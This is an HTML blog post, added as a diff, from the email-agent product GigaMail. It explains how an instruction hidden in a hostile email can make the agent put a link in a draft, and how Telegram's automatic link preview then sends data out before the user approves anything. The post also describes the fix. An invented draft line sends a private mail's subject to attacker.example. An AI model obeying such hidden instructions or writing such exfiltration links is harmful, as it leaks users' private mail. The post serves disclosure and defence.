@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>A link preview sent data out before anyone approved the draft</title>
+<meta name="description" content="Telegram fetches the first link of a message from its own servers to build a preview. A draft written by an agent that read a hostile mail can use that to send data out before you tap anything. How it works and what we changed.">
+<meta name="theme-color" content="#fcf6fa">
+<link rel="canonical" href="https://gigamail.ai/blog/telegram-link-preview.html">
+<link rel="icon" href="../brand/gigamail.ico?v=2">
+<link rel="icon" type="image/png" sizes="96x96" href="../brand/gigamail-logo-96.png?v=2">
+<link rel="apple-touch-icon" href="../brand/gigamail-logo-256.png?v=2">
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="GigaMail">
+<meta property="og:url" content="https://gigamail.ai/blog/telegram-link-preview.html">
+<meta property="og:title" content="A link preview sent data out before anyone approved the draft">
+<meta property="og:description" content="Telegram fetches the first link of a message to build a preview, as soon as the message arrives. A draft written by an agent that read a hostile mail can use that to send data out before you tap anything.">
+<meta property="og:image" content="https://gigamail.ai/social-card.png?v=3">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="A link preview sent data out before anyone approved the draft">
+<meta name="twitter:description" content="Telegram fetches the first link of a message to build a preview, as soon as the message arrives. A draft written by an agent that read a hostile mail can use that to send data out before you tap anything.">
+<meta name="twitter:image" content="https://gigamail.ai/social-card.png?v=3">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "@id": "https://gigamail.ai/blog/telegram-link-preview.html#article", "url": "https://gigamail.ai/blog/telegram-link-preview.html", "headline": "A link preview sent data out before anyone approved the draft", "description": "Telegram fetches the first link of a message from its own servers to build a preview. A draft written by an agent that read a hostile mail can use that to send data out before you tap anything. How it works and what we changed.", "inLanguage": "en", "datePublished": "2026-11-24", "dateModified": "2026-11-24", "publisher": {"@type": "Organization", "name": "GigaMail", "url": "https://gigamail.ai/"}, "isPartOf": {"@type": "WebSite", "@id": "https://gigamail.ai/#website", "url": "https://gigamail.ai/", "name": "GigaMail"}, "about": {"@id": "https://gigamail.ai/#software"}}</script>
+<link rel="stylesheet" href="../fonts/poppins.css?v=1">
+<link rel="stylesheet" href="../home.css?v=37">
+<link rel="stylesheet" href="../pages.css?v=1">
+<style>
+.post .wrap.narrow { max-width: 760px; }
+.post .hero.sub h1 { max-width: 24ch; }
+.post p, .post li { font-size: 1.02rem; line-height: 1.7; }
+.post section p { margin: 0 0 14px; }
+.post ul { padding-left: 22px; margin: 0 0 14px; }
+.post li { margin-bottom: 6px; }
+.post pre { background: var(--gm-fill); color: var(--gm-ink); border-radius: 12px; padding: 14px 16px; margin: 0 0 6px; overflow-x: auto; font-family: var(--mono); font-size: 0.84rem; line-height: 1.55; }
+.post .cap { font-size: 0.88rem; margin: 0 0 18px; }
+.post .fig { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 6px 0 18px; }
+.post .fig .card { padding: 18px 20px; }
+.post .fig .num { font-size: 2.6rem; font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; }
+.post .fig .after .num { color: var(--gm-pink); }
+.post .fig p { font-size: 0.9rem; margin: 4px 0 0; }
+@media (max-width: 560px) { .post .fig { grid-template-columns: 1fr; } }
+</style>
+<script type="module" src="/business/analytics.js"></script>
+<script type="module" src="/download-count.js"></script>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="../" aria-label="GigaMail home"><img src="../brand/gigamail-wordmark.png?v=2" alt="GigaMail" width="136" height="34"></a>
+    <nav class="topnav" aria-label="Sections">
+      <a href="../features.html">What it does</a>
+      <a href="../security.html#gate">Approval</a>
+      <a href="../#install">Install</a>
+      <a href="../mcp-map.html">MCP map</a>
+      <a href="../gigamail-vs-agentmail.html">vs AgentMail</a>
+      <a href="../security.html">Security</a>
+      <a href="../email-check.html" style="color:var(--gm-pink);font-weight:600">Email check</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="btn btn-ghost" href="https://github.com/adecubed/gigamail" rel="noopener"><svg class="gh-star" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.6l2.9 5.9 6.5.9-4.7 4.6 1.1 6.5L12 17.4l-5.8 3.1 1.1-6.5-4.7-4.6 6.5-.9z"/></svg><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5a12 12 0 0 0-3.8 23.4c.6.1.8-.3.8-.6v-2.2c-3.3.7-4-1.4-4-1.4-.6-1.4-1.4-1.8-1.4-1.8-1.1-.7.1-.7.1-.7 1.2.1 1.8 1.2 1.8 1.2 1.1 1.8 2.8 1.3 3.5 1 .1-.8.4-1.3.8-1.6-2.7-.3-5.5-1.3-5.5-5.9 0-1.3.5-2.4 1.2-3.2-.1-.3-.5-1.5.1-3.2 0 0 1-.3 3.3 1.2a11.5 11.5 0 0 1 6 0C17 4.6 18 4.9 18 4.9c.6 1.7.2 2.9.1 3.2.8.8 1.2 1.9 1.2 3.2 0 4.6-2.8 5.6-5.5 5.9.4.4.8 1.1.8 2.2v3.3c0 .3.2.7.8.6A12 12 0 0 0 12 .5z"/></svg><span class="gh-text">GitHub</span></a>
+    <a class="btn btn-primary" href="../#install">Download</a>
+  </div>
+</header>
+
+<main class="subpage post">
+<section class="hero sub" aria-labelledby="t">
+  <div class="wrap narrow">
+    <p class="kicker"><a href="./">Blog</a> · 24 November 2026</p>
+    <h1 id="t">A link preview sent data out <em>before anyone approved the draft.</em></h1>
+    <p class="lede">An approval step protects what happens after you say yes. It does not protect what happens on the way to you.</p>
+  </div>
+</section>
+
+<section aria-labelledby="s1"><div class="wrap narrow">
+  <h2 id="s1">The draft that leaked on arrival</h2>
+  <p>GigaMail can send a draft to your phone on Telegram, so you can read it and approve or reject it. The agent that writes the draft has read your mail, and some of that mail is written by strangers. An instruction hidden in one of them (we described how in <a href="./hidden-text.html">the article on hidden text</a>) can ask the agent for something simple: put this link in the draft.</p>
+<pre><code>Hello, I will confirm on Tuesday.
+https://attacker.example/?d=SUBJECT-OF-A-PRIVATE-MAIL</code></pre>
+  <p class="muted cap">An invented draft. The address after <code>d=</code> is whatever the hostile mail asked the agent to copy there.</p>
+  <p>Nobody has to tap that link. Telegram fetches the first link of a message from its own servers to build the preview shown under it, as soon as the message is sent. So the request reached <code>attacker.example</code>, with the data in its address, at the moment the draft arrived on the phone: before you read it, and whether you then approved it or not.</p>
+</div></section>
+
+<section aria-labelledby="s2"><div class="wrap narrow">
+  <h2 id="s2">Why the approval did not help</h2>
+  <p>In GigaMail, sending, replying and deleting wait for a person's approval that the agent cannot give. That gate decides what leaves as an email. This leak was not an email. It was a side effect of showing the draft for approval: the step that is meant to be the safe one carried the data out by itself.</p>
+  <p>The shape is general. A channel that displays an agent's output, and that follows links on its own to decorate them, turns every link the agent writes into a request somebody else's server makes. We have not checked other chat or ticket tools, so we name none; the question is worth asking of any of them.</p>
+</div></section>
+
+<section aria-labelledby="s3"><div class="wrap narrow">
+  <h2 id="s3">What changed</h2>
+  <p>Since GigaMail 0.6.7, every text GigaMail sends to Telegram asks Telegram not to build a link preview. The example notify command shipped in <code>policy.py</code>, which people copy when they write their own, does the same. The link is still in the message, as text. Nothing fetches it unless you do.</p>
+  <p>The fix is small: the fetch is switched off, so there is no list of "safe" links to get wrong.</p>
+</div></section>
+
+<section aria-labelledby="s4"><div class="wrap narrow">
+  <h2 id="s4">What it does not solve</h2>
+  <ul>
+    <li><strong>Links you tap.</strong> If you open the link in a draft, your browser makes the request, with whatever is in the address. Read the draft before you approve it, links included.</li>
+    <li><strong>Other ways out.</strong> This closes one route. An agent that has read a hostile mail is still untrusted, which is why what it can send is gated and what it can read is narrowed.</li>
+    <li><strong>The channel itself.</strong> Drafts shown on Telegram are readable to anyone who holds the bot token; <a href="https://github.com/adecubed/gigamail/blob/main/SECURITY.md" rel="noopener">SECURITY.md</a> lists the limits of approving from Telegram.</li>
+  </ul>
+  <p><strong>Sources.</strong> The change is the entry "Telegram messages have no link preview" under v0.6.7 in the <a href="https://github.com/adecubed/gigamail/blob/main/CHANGELOG.md" rel="noopener">GigaMail changelog</a>; the limits are in <a href="https://github.com/adecubed/gigamail/blob/main/SECURITY.md" rel="noopener">SECURITY.md</a>. We did not test Telegram's fetching ourselves for this article beyond what the changelog records.</p>
+  <p class="muted note">GigaMail is open source (AGPL-3.0): <a href="https://github.com/adecubed/gigamail" rel="noopener">github.com/adecubed/gigamail</a>.</p>
+</div></section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>GigaMail — Adecubed — AGPL-3.0</span>
+    <a href="../privacy.html">Privacy Policy</a>
+    <a href="../terms.html">Terms of Service</a>
+    <a href="../credits.html">Code credits</a>
+    <a href="../mcp-map.html">MCP map</a>
+    <a href="../gigamail-vs-agentmail.html">GigaMail vs AgentMail</a>
+    <a href="../gigamail-vs-composio.html">GigaMail vs Composio</a>
+    <a href="../gigamail-vs-copilot.html">GigaMail vs Copilot</a>
+    <a href="../changelog.html">What's new</a>
+    <a href="./">Blog</a>
+    <a href="../mail-city.html">Mail City</a>
+    <a href="../email-check.html">Email checker</a>
+    <span class="spacer"></span>
+    <a href="mailto:founder@adecubed.com">founder@adecubed.com</a>
+  </div>
+</footer>
+</body>
+</html>
